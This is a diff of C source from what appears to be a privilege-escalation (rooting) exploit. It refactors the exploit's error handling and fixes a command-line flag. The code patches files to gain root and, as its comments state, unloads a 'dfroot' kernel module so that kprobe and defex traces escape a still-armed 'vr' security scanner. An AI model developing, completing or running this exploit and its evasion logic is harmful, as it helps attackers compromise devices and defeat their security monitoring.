@@ -233,13 +233,6 @@ static int patch_file_cbc(const char *path, const char *payload, size_t len,
     if (!use_helper) close(file_fd);
     close(sk_send);
     if (rc == 0) printf("patched %zu bytes to %s+0x%zx\n", len, path, foff);
-        /* W1c refused: bootstrap was renamed away, manager never launched.
-         * Unload the ko so no kprobe/defex residue faces the still-armed
-         * vr scanner; the app locks re-runs until reboot as usual. */
-        printf("vr: ERROR - root chain aborted (vr intact), unloading dfroot\n");
-        syscall(__NR_delete_module, "dfroot", O_NONBLOCK);
-    }
-
     return rc;
 }
 
@@ -556,6 +549,7 @@ static int setup(int argc, char **argv) {
         else if (!strcmp(a, "--vr-off") && i + 1 < argc)
             g_vr_off = strtoull(argv[++i], NULL, 0);  /* dec or 0x hex */
         else if (!strcmp(a, "--vr-auto"))
+            g_vr_auto = 1;
         else { usage(argv[0]); return 2; }
     }
     if (!encap_port || !sender_port || !spi || !have_aes) {
@@ -640,6 +634,14 @@ static int exploit(void) {
     printf("timeout: ERROR - check logcat & dmesg\n");
 done:
     if (rc == 3) printf("patch: ERROR - failed to patch files\n");
+    if (rc == 4) {
+        /* W1c refused: bootstrap was renamed away, manager never launched.
+         * Unload the ko so no kprobe/defex residue faces the still-armed
+         * vr scanner; the app locks re-runs until reboot as usual. */
+        printf("vr: ERROR - root chain aborted (vr intact), unloading dfroot\n");
+        syscall(__NR_delete_module, "dfroot", O_NONBLOCK);
+    }
+
     return rc;
 }
 
